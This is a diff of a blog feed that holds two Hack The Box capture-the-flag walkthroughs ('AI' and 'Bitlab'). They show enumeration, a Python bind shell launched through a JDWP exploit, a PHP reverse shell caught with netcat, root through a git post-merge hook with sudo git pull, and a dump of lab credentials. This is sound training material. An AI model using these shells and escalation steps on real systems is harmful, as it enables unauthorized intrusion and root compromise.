@@ -10,10 +10,10 @@
         
         <item>
             <title>Hack The Box - AI</title>
-            <link>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</link>
+            <link>https://ceso.github.io/posts/htb/ai/</link>
             <pubDate>Fri, 07 Feb 2020 00:00:00 +0000</pubDate>
             
-            <guid>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</guid>
+            <guid>https://ceso.github.io/posts/htb/ai/</guid>
             <description>Quick Summary Finally, I&amp;rsquo;m posting the walk-through of this box, currently, I&amp;rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D. At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.
 This was a box where for the foothold, you needed to upload a .</description>
             <content type="html"><![CDATA[
@@ -35,7 +35,8 @@ At the time I did this box, I was only documenting with screenshots, so some dat
 <h2 id="nmap">Nmap</h2>
 
 <p>As always the enumeration starts by running Nmap:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console"># Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
+
+<pre><code class="language-console"># Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
 Nmap scan report for ai.htb (10.10.10.163)
 Host is up (0.019s latency).
 Not shown: 998 closed ports
@@ -65,7 +66,9 @@ Network Distance: 2 hops
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Wed Dec 11 15:33:50 2019 -- 1 IP address (1 host up) scanned in 20.74 seconds</code></pre></div>
+# Nmap done at Wed Dec 11 15:33:50 2019 -- 1 IP address (1 host up) scanned in 20.74 seconds
+</code></pre>
+
 <p>Which discovers SSH and HTTP (Apache 2.4.29 as the server) open.</p>
 
 <h2 id="web-enumeration">Web enumeration</h2>
@@ -108,7 +111,8 @@ Some enumeration of it is carried.</p>
 <h2 id="foothold">Foothold</h2>
 
 <p>A step to make an sql injection was carried in the same way than before for the RCE, which resulted in nothing, based on that gobuster was run against AI to see if there was some web page that could give hints in HOW to properly write the sql injection for it being interpreted by the AI.</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
+
+<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -133,7 +137,9 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 /ai.php (Status: 200)
 ===============================================================
 2020/02/07 15:48:32 Finished
-===============================================================</code></pre></div>
+===============================================================
+</code></pre>
+
 <p>As is possible to see above, <code>intelligence.php</code> was discovered, once that page is accessed, is found a guide on how to write some queries to the AI:</p>
 
 
@@ -175,8 +181,9 @@ passwd: H,Sq9t6}a&lt;)?q93_
 </code></pre>
 
 <p>Getting a success:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
-alexa@10.10.10.163&#39;s password: 
+
+<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
+alexa@10.10.10.163's password: 
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -203,11 +210,14 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 
 Last login: Fri Feb  7 20:14:41 2020 from 10.10.14.29
 alexa@AI:~$ wc -c user.txt
-33 user.txt</code></pre></div>
+33 user.txt
+</code></pre>
+
 <h2 id="privilege-escalation">Privilege escalation</h2>
 
 <p>When is checked which net. services are listening, was found :8080:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">alexa@AI:~$ ss -punta
+
+<pre><code class="language-console">alexa@AI:~$ ss -punta
 Netid               State                    Recv-Q                Send-Q                                       Local Address:Port                                        Peer Address
 :Port                 
 udp                 UNCONN                   0                     0                                            127.0.0.53%lo:53                                               0.0.0.0
@@ -231,7 +241,9 @@ tcp                 LISTEN                   0                     100          
 tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8080                                                   *:*                    
 tcp                 LISTEN                   0                     128                                                      *:80                                                     *:*                    
 tcp                 LISTEN                   0                     128                                                   [::]:22                                                  [::]:*                    
-tcp                 TIME-WAIT                0                     0                                       [::ffff:127.0.0.1]:8080                                  [::ffff:127.0.0.1]:3883</code></pre></div>
+tcp                 TIME-WAIT                0                     0                                       [::ffff:127.0.0.1]:8080                                  [::ffff:127.0.0.1]:3883
+</code></pre>
+
 <p>then an ssh tunnel with <code>ssh -L 8080:localhost:8080 alexa@10.10.10.163</code> was run to know which service it was, resulting in tomcat:</p>
 
 
@@ -240,34 +252,46 @@ tcp                 TIME-WAIT                0                     0            
 
 
 <p>Checked the process runing, is possible to see that tomcat is being executed with root user and <a href="https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html" target="_blank">JDWP</a> enabled:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start</code></pre></div>
+
+<pre><code class="language-console">root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
+</code></pre>
+
 <p>A quick search google gives a result the next <a href="https://www.exploit-db.com/exploits/46501" target="_blank">exploit</a></p>
 
 <p>Then to use that exploit a <code>bind.sh</code> is created under <code>/tmp</code> with the next code:</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&#39;&#39;,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])&#34;</span></code></pre></div>
+
+<pre><code class="language-python">python -c &quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])&quot;
+</code></pre>
+
 <p>So, it will bind a shell in the port 2222, after it the exploit is run using that script:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on &#39;java.lang.String.indexOf&#39; --cmd /tmp/bind.sh 
-[+] Targeting &#39;127.0.0.1:8000&#39;
-[+] Reading settings for &#39;OpenJDK 64-Bit Server VM - 11.0.4&#39;
+
+<pre><code class="language-console">alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
+[+] Targeting '127.0.0.1:8000'
+[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
 [+] Found Runtime class: id=650
 [+] Found Runtime.getRuntime(): id=7f9080006b60
 [+] Created break event id=2
-[+] Waiting for an event on &#39;java.lang.String.indexOf&#39;
+[+] Waiting for an event on 'java.lang.String.indexOf'
 [+] Received matching event from thread 0x6ed
-[+] Selected payload &#39;/tmp/bind.sh&#39;
+[+] Selected payload '/tmp/bind.sh'
 [+] Command string object created id:6ee
 [+] Runtime.getRuntime() returned context id:0x6ef
 [+] found Runtime.exec(): id=7f9080006b98
 [+] Runtime.exec() successful, retId=6f0
-[!] Command successfully executed</code></pre></div>
+[!] Command successfully executed
+</code></pre>
+
 <p>Done that, is tried to get a connection to the server with nc to the server in port specified in <code>bind.sh</code> getting root access with it:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
+
+<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
 ai.lnx.htb [10.10.10.163] 2222 (?) open
 bash: cannot set terminal process group (6086): Inappropriate ioctl for device
 bash: no job control in this shell
 root@AI:~# wc -c /root/root.txt
 wc -c /root/root.txt
-33 /root/root.txt</code></pre></div>
+33 /root/root.txt
+</code></pre>
+
 <p>Done, we have root access and the root.txt flag :D.</p>
 
 <p>This was so far one of the boxes I didn&rsquo;t like at all, thanks to the esoteric-ish foothold it had, I didn&rsquo;t end with a feeling of learning something at all after doing this box, anyway, that&rsquo;s all, later I&rsquo;m planning to start blogging current adventure into preparing OSCP, stay tuned for it.</p>
@@ -276,10 +300,10 @@ wc -c /root/root.txt
         
         <item>
             <title>Hack The Box - Bitlab</title>
-            <link>https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/</link>
+            <link>https://ceso.github.io/posts/htb/bitlab/</link>
             <pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate>
             
-            <guid>https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/</guid>
+            <guid>https://ceso.github.io/posts/htb/bitlab/</guid>
             <description>Quick Summary First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the sudo + git path as I&amp;rsquo;m just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path.</description>
             <content type="html"><![CDATA[
 
@@ -299,7 +323,8 @@ wc -c /root/root.txt
 <h2 id="nmap">Nmap</h2>
 
 <p>We start running nmap to get which ports/services are being exposed:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
+
+<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 22:33 EST
 Nmap scan report for bitlab.htb (10.10.10.114)
 Host is up (0.019s latency).
@@ -324,7 +349,9 @@ No exact OS matches for host (test conditions non-ideal).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Thu Dec 12 22:34:15 2019 -- 1 IP address (1 host up) scanned in 17.39 seconds</code></pre></div>
+# Nmap done at Thu Dec 12 22:34:15 2019 -- 1 IP address (1 host up) scanned in 17.39 seconds
+</code></pre>
+
 <p>And we get SSH (22) and HTTP (80) are open + that the web service which is running on port 80 is <a href="https://gitlab.com/" target="_blank">Gitlab</a>.</p>
 
 <h2 id="web-enumeration">Web enumeration</h2>
@@ -351,15 +378,19 @@ OS and Service detection performed. Please report any incorrect results at https
 <p>We notice that <code>Gitlab Login</code> is an obfuscated js code, we jump into deobfuscate it (I used <a href="https://lelinhtinh.github.io/de4js/" target="_blank">de4js</a> but any deobfuscation tool or even a python console will do it):</p>
 
 <p>From the code:</p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">javascript</span><span class="o">:</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span> <span class="kd">var</span> <span class="nx">_0x4b18</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;\x76\x61\x6C\x75\x65&#34;</span><span class="p">,</span><span class="s2">&#34;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&#34;</span><span class="p">,</span><span class="s2">&#34;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&#34;</span><span class="p">,</span><span class="s2">&#34;\x63\x6C\x61\x76\x65&#34;</span><span class="p">,</span><span class="s2">&#34;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&#34;</span><span class="p">,</span><span class="s2">&#34;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&#34;</span><span class="p">];</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="o">=</span> <span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">4</span><span class="p">])[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="o">=</span> <span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span> <span class="p">})()</span>
-</code></pre></div>
+
+<pre><code class="language-js">javascript:(function(){ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
+</code></pre>
+
 <p>We get the following code:</p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">javascript</span><span class="o">:</span> <span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
-    <span class="kd">var</span> <span class="nx">_0x4b18</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;value&#34;</span><span class="p">,</span> <span class="s2">&#34;user_login&#34;</span><span class="p">,</span> <span class="s2">&#34;getElementById&#34;</span><span class="p">,</span> <span class="s2">&#34;clave&#34;</span><span class="p">,</span> <span class="s2">&#34;user_password&#34;</span><span class="p">,</span> <span class="s2">&#34;11des0081x&#34;</span><span class="p">];</span>
-    <span class="nb">document</span><span class="p">[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
-    <span class="nb">document</span><span class="p">[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">4</span><span class="p">])[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
-<span class="p">})()</span>
-</code></pre></div>
+
+<pre><code class="language-js">javascript: (function () {
+    var _0x4b18 = [&quot;value&quot;, &quot;user_login&quot;, &quot;getElementById&quot;, &quot;clave&quot;, &quot;user_password&quot;, &quot;11des0081x&quot;];
+    document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = _0x4b18[3];
+    document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = _0x4b18[5];
+})()
+</code></pre>
+
 <p>With that we get credentials we could try into the login, an user called <code>clave</code> and a password <code>11des0081x</code>, after we try to login with those credentials we are loged and have access to some projects:</p>
 
 
@@ -379,22 +410,24 @@ We continue enumerating a bit more, and see that the project called <code>Deploy
     <img src="/images/htb/bitlab/1.7-web_enum.png"  class="center"  style="border-radius: 8px;"  />
 
 
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
 
-<span class="nv">$input</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;php://input&#34;</span><span class="p">);</span>
-<span class="nv">$payload</span>  <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
+<pre><code class="language-php">&lt;?php
 
-<span class="nv">$repo</span> <span class="o">=</span> <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">project</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-<span class="nv">$event</span> <span class="o">=</span> <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">event_type</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-<span class="nv">$state</span> <span class="o">=</span> <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">object_attributes</span><span class="o">-&gt;</span><span class="na">state</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-<span class="nv">$branch</span> <span class="o">=</span> <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">object_attributes</span><span class="o">-&gt;</span><span class="na">target_branch</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+$input = file_get_contents(&quot;php://input&quot;);
+$payload  = json_decode($input);
 
-<span class="k">if</span> <span class="p">(</span><span class="nv">$repo</span><span class="o">==</span><span class="s1">&#39;Profile&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$branch</span><span class="o">==</span><span class="s1">&#39;master&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$event</span><span class="o">==</span><span class="s1">&#39;merge_request&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$state</span><span class="o">==</span><span class="s1">&#39;merged&#39;</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">echo</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="s1">&#39;cd ../profile/; sudo git pull&#39;</span><span class="p">),</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
-<span class="p">}</span>
+$repo = $payload-&gt;project-&gt;name ?? '';
+$event = $payload-&gt;event_type ?? '';
+$state = $payload-&gt;object_attributes-&gt;state ?? '';
+$branch = $payload-&gt;object_attributes-&gt;target_branch ?? '';
 
-<span class="k">echo</span> <span class="s2">&#34;OK</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
-</code></pre></div>
+if ($repo=='Profile' &amp;&amp; $branch=='master' &amp;&amp; $event=='merge_request' &amp;&amp; $state=='merged') {
+    echo shell_exec('cd ../profile/; sudo git pull'),&quot;\n&quot;;
+}
+
+echo &quot;OK\n&quot;;
+</code></pre>
+
 <p>Tying together the pieces we have at this point, we can figure out the foothold: we need to upload a php reverse shell, having it merged to master (the code of <code>index.php</code> specifies git pull will being executed basically if there was a merge to master), once that is done, a webhook will execute <code>index.php</code> from <code>Deployer</code> with this we will have our reverse shell uploaded to server.</p>
 
 <h2 id="rce-www-data-root">RCE -&gt; www-data -&gt; root</h2>
@@ -410,20 +443,24 @@ We continue enumerating a bit more, and see that the project called <code>Deploy
 
 <p>Now we know that indeed that the mentioned url above will be the one wee need to use.
 We run the listener for our reverse shell and execute it, with it having our rce:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
+
+<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
 listening on [any] 1234 ...
 connect to [10.10.14.7] from (UNKNOWN) [10.10.10.114] 57130
 Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
  19:56:40 up 12 min,  0 users,  load average: 0.55, 0.56, 0.46
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can&#39;t access tty; job control turned off
-$ python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
 www-data@bitlab:/var/www$ pwd
 pwd
-/var/www</code></pre></div>
+/var/www
+</code></pre>
+
 <p>We check if we have sudo rights, where is the home of www-data and what we found there:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">www-data@bitlab:/var/www$ sudo -l
+
+<pre><code class="language-console">www-data@bitlab:/var/www$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on bitlab:
     env_reset, exempt_group=sudo, mail_badpass,
@@ -446,11 +483,14 @@ drwxr-xr-x 8 root root  4096 Jan 10 20:02 .git
 -rw-r--r-- 1 root root   110 Jan  4  2019 README.md
 -rw-r--r-- 1 root root 93029 Jan  5  2019 developer.jpg
 -rw-r--r-- 1 root root  4184 Jan  4  2019 index.php
--rw-r--r-- 1 root root  5493 Jan 10 19:55 rev-sh.php    </code></pre></div>
+-rw-r--r-- 1 root root  5493 Jan 10 19:55 rev-sh.php    
+</code></pre>
+
 <p>So far we know that the repos of git are under <code>/var/www/html/</code> and that we are allowed to do a git pull with sudo rights inside the repos, this is what we will be using to get root by taking advantage of the webhooks enabled in gitlab (post-merge hook) and the ability to run git pull with root rights (<code>git pull</code> is like git fetch and git merge in one for saying it in a way), for understanding how these 2 things work, jump into the documentation of <a href="https://git-scm.com/docs/githooks#_post_merge" target="_blank">hooks: post merge</a> and the one for <a href="https://git-scm.com/docs/git-pull" target="_blank">git pull</a>.</p>
 
 <p>Our repo doesn&rsquo;t allow us to edit files there, so we copy the repo to a place where we have them:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
+
+<pre><code class="language-console">www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
 cp -r profile /tmp/profile
 www-data@bitlab:/tmp/profile$ ls -la
 ls -la
@@ -464,16 +504,22 @@ drwxr-xr-x 8 www-data www-data  4096 Jan 10 20:03 .git
 -rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 foo
 -rw-r--r-- 1 www-data www-data  4184 Jan 10 20:03 index.php
 drwxr-xr-x 3 www-data www-data  4096 Jan 10 20:08 profile
--rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 rev-sh.php</code></pre></div>
+-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 rev-sh.php
+</code></pre>
+
 <p>We create a script named as <code>post-merge</code> inside <code>.git/hooks</code> to get a shell as root and give to it execution rights:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ cd .git/hooks
+
+<pre><code class="language-console">www-data@bitlab:/tmp/profile$ cd .git/hooks
 cd .git/hooks
-www-data@bitlab:/tmp/profile/.git/hooks$ echo &#39;exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2&#39; &gt; post-merge
-&lt; &#39;exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2&#39; &gt; post-merge
+www-data@bitlab:/tmp/profile/.git/hooks$ echo 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
+&lt; 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
 www-data@bitlab:/tmp/profile/.git/hooks$ chmod u+x post-merge
-chmod u+x post-merge</code></pre></div>
+chmod u+x post-merge
+</code></pre>
+
 <p>Once that is done, we upload any file (doesn&rsquo;t matter) to gitlab and merge it, once that is done from inside this location we have rights, we run <code>sudo git pull</code> and with that we will be root:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ sudo git pull
+
+<pre><code class="language-console">www-data@bitlab:/tmp/profile$ sudo git pull
 sudo git pull
 remote: Enumerating objects: 4, done.
 remote: Counting objects: 100% (4/4), done.
@@ -498,7 +544,9 @@ ls
 root.txt
 root@bitlab:~# wc -c root.txt
 wc -c root.txt
-33 root.txt</code></pre></div>
+33 root.txt
+</code></pre>
+
 <p>With this we can already go to <code>/home</code> and see from there which user and it&rsquo;s respective flag.</p>
 
 <h2 id="beyond-root">Beyond root</h2>
@@ -520,23 +568,30 @@ wc -c root.txt
 
 
 <p>We open it and se it&rsquo;s a script to connect to the database and get a dump of profiles:</p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">$db_connection</span> <span class="o">=</span> <span class="nx">pg_connect</span><span class="p">(</span><span class="s2">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span><span class="p">);</span>
-<span class="nx">$result</span> <span class="o">=</span> <span class="nx">pg_query</span><span class="p">(</span><span class="nx">$db_connection</span><span class="p">,</span> <span class="s2">&#34;SELECT * FROM profiles&#34;</span><span class="p">);</span>
-</code></pre></div>
+
+<pre><code class="language-js">&lt;?php
+$db_connection = pg_connect(&quot;host=localhost dbname=profiles user=profiles password=profiles&quot;);
+$result = pg_query($db_connection, &quot;SELECT * FROM profiles&quot;);
+</code></pre>
+
 <p>Then, inside the profile project we add a new file with that code, but also we create an array with <code>pg_fetch_all($result)</code> in order to save all the profiles dumped, so the result is this one:</p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">$db_connection</span> <span class="o">=</span> <span class="nx">pg_connect</span><span class="p">(</span><span class="s2">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span><span class="p">);</span>
-<span class="nx">$result</span> <span class="o">=</span> <span class="nx">pg_query</span><span class="p">(</span><span class="nx">$db_connection</span><span class="p">,</span> <span class="s2">&#34;SELECT * FROM profiles&#34;</span><span class="p">);</span>
-<span class="nx">$arr</span> <span class="o">=</span> <span class="nx">pg_fetch_all</span><span class="p">(</span><span class="nx">$result</span><span class="p">);</span>
-<span class="nx">print_r</span><span class="p">(</span><span class="nx">$arr</span><span class="p">);</span>
-</code></pre></div>
+
+<pre><code class="language-js">&lt;?php
+$db_connection = pg_connect(&quot;host=localhost dbname=profiles user=profiles password=profiles&quot;);
+$result = pg_query($db_connection, &quot;SELECT * FROM profiles&quot;);
+$arr = pg_fetch_all($result);
+print_r($arr);
+</code></pre>
+
 <p>After save and merge of it, we go to <code>http://10.10.10.114/profile/&lt;name you give to the script&gt;</code>, and we should get as a result printed an array with our previous user <code>clave</code> and a password:</p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nb">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">=&gt;</span> <span class="nb">Array</span> <span class="p">(</span> <span class="p">[</span><span class="nx">id</span><span class="p">]</span> <span class="p">=&gt;</span> <span class="mi">1</span> <span class="p">[</span><span class="nx">username</span><span class="p">]</span> <span class="p">=&gt;</span> <span class="nx">clave</span> <span class="p">[</span><span class="nx">password</span><span class="p">]</span> <span class="p">=&gt;</span> <span class="nx">c3NoLXN0cjBuZy1wQHNz</span><span class="o">==</span> <span class="p">)</span> <span class="p">)</span>
-</code></pre></div>
+
+<pre><code class="language-js">Array ( [0] =&gt; Array ( [id] =&gt; 1 [username] =&gt; clave [password] =&gt; c3NoLXN0cjBuZy1wQHNz== ) )
+</code></pre>
+
 <p>Before trying to crack the password, we try to use as it is, and indeed it was just that one it was not encrypted!</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
-clave@10.10.10.114&#39;s password: 
+
